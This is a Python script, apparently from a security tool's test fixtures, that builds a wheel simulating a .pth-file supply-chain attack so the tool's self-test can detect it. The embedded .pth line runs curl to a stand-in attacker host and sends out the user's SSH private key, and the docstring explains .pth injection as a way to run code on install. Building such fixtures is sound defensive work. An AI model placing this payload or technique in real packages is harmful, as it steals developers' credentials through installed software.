"""
Build the malicious-pth test wheel used in the self-test workflow.

This script creates a minimal Python wheel that contains a .pth file
with executable Python code — exactly the supply chain attack technique
used in the real litellm 1.82.8 incident (the .pth file was executed
automatically by Python's site module on interpreter startup).

The wheel is intentionally harmful-looking but safe: the curl command
targets a non-existent domain (attacker.example.com) and will never
actually execute in any sandboxed CI environment.

Usage:
    python tests/fixtures/build_test_wheel.py [output_dir]

The wheel is committed to tests/fixtures/wheels/ so the self-test
workflow does not need to run this script — it is provided for
transparency and to allow regeneration if needed.
"""

import base64
import hashlib
import os
import sys
import zipfile


def _sha256_record(content: bytes) -> str:
    digest = hashlib.sha256(content).digest()
    return "sha256=" + base64.urlsafe_b64encode(digest).rstrip(b"=").decode()


def build_malicious_pth_wheel(dest_dir: str) -> str:
    """
    Build malicious_pth-1.0.0-py3-none-any.whl in dest_dir.

    The wheel contains a single .pth file whose content is valid Python
    (import os;os.system(...)).  Python's site module executes any line
    in a .pth file that starts with 'import' — making .pth injection a
    zero-interaction remote-code-execution primitive on package install.

    Returns the absolute path to the created wheel.
    """
    # Malicious .pth payload — mimics the litellm 1.82.8 attack vector.
    pth_content = (
        b'import os;os.system("curl -s http://attacker.example.com/exfil'
        b'?k=$(cat ~/.ssh/id_rsa | base64)")\n'
    )

    wheel_meta = (
        b"Wheel-Version: 1.0\n"
        b"Generator: pipguard-test\n"
        b"Root-Is-Purelib: true\n"
        b"Tag: py3-none-any\n"
    )

    metadata = (
        b"Metadata-Version: 2.1\n"
        b"Name: malicious-pth\n"
        b"Version: 1.0.0\n"
        b"Summary: Test fixture for pipguard - simulates litellm 1.82.8 "
        b"supply chain attack via .pth file\n"
    )

    files = {
        "malicious_pth.pth": pth_content,
        "malicious_pth-1.0.0.dist-info/WHEEL": wheel_meta,
        "malicious_pth-1.0.0.dist-info/METADATA": metadata,
    }

    record_lines = [
        f"{name},{_sha256_record(content)},{len(content)}\n"
        for name, content in files.items()
    ]
    record_lines.append("malicious_pth-1.0.0.dist-info/RECORD,,\n")
    record_content = "".join(record_lines).encode()

    wheel_name = "malicious_pth-1.0.0-py3-none-any.whl"
    wheel_path = os.path.join(dest_dir, wheel_name)

    with zipfile.ZipFile(wheel_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name, content in files.items():
            zf.writestr(name, content)
        zf.writestr("malicious_pth-1.0.0.dist-info/RECORD", record_content)

    return wheel_path


if __name__ == "__main__":
    out_dir = sys.argv[1] if len(sys.argv) > 1 else os.path.dirname(__file__) + "/wheels"
    os.makedirs(out_dir, exist_ok=True)
    path = build_malicious_pth_wheel(out_dir)
    print(f"Built: {path} ({os.path.getsize(path)} bytes)")
